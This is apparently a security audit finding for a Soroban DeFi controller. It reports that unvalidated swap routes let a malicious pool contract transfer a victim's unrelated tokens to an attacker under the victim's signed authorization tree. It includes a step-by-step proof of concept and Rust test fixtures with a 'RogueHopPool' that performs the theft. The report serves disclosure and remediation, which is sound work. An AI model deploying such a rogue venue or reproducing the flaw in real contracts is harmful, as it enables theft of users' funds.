### Title
Unvalidated swap routes can invoke malicious venues that steal unrelated caller tokens through the signed authorization tree - ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary
`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, `multiply`, and other router-backed strategy paths accept caller-supplied route data and invoke the configured router without constraining route venues. A malicious venue can perform an unrelated `token.transfer(victim, attacker, amount)` while executing beneath the caller's authorization. Soroban records that transfer as a child of the strategy invocation; if the victim submits the simulated authorization tree, the transfer succeeds. The controller's output measurement and account-health checks do not detect the unrelated wallet theft because the route can still return sufficient output.

### Finding Description
`process_swap_collateral` authenticates the caller, verifies ownership or delegation, and passes the caller-controlled `swap` payload into `withdraw_and_swap_from_supply` without inspecting the route. [1](#0-0)  `swap_tokens` authorizes only the controller's exact input transfer to the configured router, then executes `router.execute_strategy` and checks only the controller's input/output balance deltas. [2](#0-1) 

The router executes each caller-selected hop through `dispatch_hop`, which dispatches to the venue adapter using the hop's supplied pool address. [3](#0-2)  It validates only that the router's input balance decreases by exactly the routed amount and its output balance increases, not that the invoked pool is known, benign, or prohibited from requesting additional caller authorization. [4](#0-3) 

The repository includes a direct regression fixture proving this authorization behavior: a router calls a route-selected malicious pool, and that pool calls `token.transfer(victim, attacker, amount)`. [5](#0-4)  Simulation records the theft as a child invocation of `swap_collateral`, while the strategy still receives a fair output. [6](#0-5)  When the victim signs the recorded tree, the unrelated wallet balance is transferred to the attacker. [7](#0-6) 

### Impact Explanation
An attacker can steal arbitrary tokens held by a user who submits a malicious swap strategy. The loss is not limited to the collateral being swapped or to assets held by the pool: the malicious venue can request an unrelated token transfer from the victim to the attacker, provided simulation records that invocation and the victim signs the resulting authorization tree.

This is theft of user funds. The stolen amount is bounded by token balances and the transfer included in the signed authorization tree, rather than by the routed input, declared minimum output, liquidation bonus, or the account's final health factor.

### Likelihood Explanation
The attack requires convincing a user to submit or sign a malicious route and its simulated authorization tree. A wallet or integration that displays only the root `swap_collateral` call, or that does not clearly disclose nested token transfers, makes the attack practical. The malicious route must still return enough output for the controller's positive-output and solvency checks, which an attacker-controlled venue can arrange.

No privileged role, oracle manipulation, leaked key, upgrade, or protocol invariant violation is required. The attacker supplies the route and deploys or identifies a venue contract that performs the additional transfer.

### Recommendation
Treat route data as adversarial and prevent arbitrary venue calls from inheriting unrelated user authorization. Prefer a router/venue allowlist or authenticated venue registry containing governance-reviewed pool or adapter addresses. If arbitrary venue contracts remain supported, clients must decode and display the complete simulated authorization tree and reject any child invocation other than the expected input token transfer.

At a protocol level, add documentation and transaction-simulation checks that reject authorization trees containing unrelated token transfers. The controller cannot fully prevent a malicious external venue from requesting caller authorization once arbitrary calls are permitted; enforcement therefore also requires wallet-level authorization-tree disclosure or restricting venue addresses.

### Proof of Concept
1. Deploy a malicious pool contract whose venue-compatible swap function performs:
   ```rust
   token::Client::new(&env, &victim_token).transfer(&victim, &attacker, &amount);
   ```
   The fixture's `RogueHopPool::swap` implements exactly this behavior. [8](#0-7) 

2. Construct a `swap_collateral` route naming that contract as a hop pool while arranging for the venue call to return enough `token_out` to satisfy the controller's measured-output check.

3. Simulate the transaction. The authorization tree contains a child `transfer(victim, attacker, amount)` under the root `swap_collateral` invocation. [9](#0-8) 

4. Have the victim submit the transaction with that simulated tree. The rogue transfer succeeds: the fixture shows the victim's unrelated wallet token falling to zero and the attacker receiving `WALLET_BALANCE`, while the collateral swap still completes normally. [10](#0-9)

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/controller/src/strategies/swap.rs (L29-54)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L23-40)
```rust
pub(crate) fn dispatch_hop(
    env: &Env,
    router: &Address,
    hop: &SwapHop,
    amount_in: i128,
    tokens_cache: &mut Map<Address, Vec<Address>>,
) -> i128 {
    let ctx = HopContext::new(env, router, hop, amount_in);
    let before_in = ctx.input_balance();
    let before_out = ctx.output_balance();

    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L42-58)
```rust
    let received = ctx
        .output_balance()
        .checked_sub(before_out)
        .unwrap_or_else(|| panic_with_error!(env, Error::ZeroOutput));
    if received <= 0 {
        panic_with_error!(env, Error::ZeroOutput);
    }

    let after_in = ctx.input_balance();
    let spent = before_in
        .checked_sub(after_in)
        .unwrap_or_else(|| panic_with_error!(env, Error::InvalidAmount));
    if spent != amount_in {
        panic_with_error!(env, Error::InvalidAmount);
    }

    received
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-70)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
}

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L229-269)
```rust
#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```
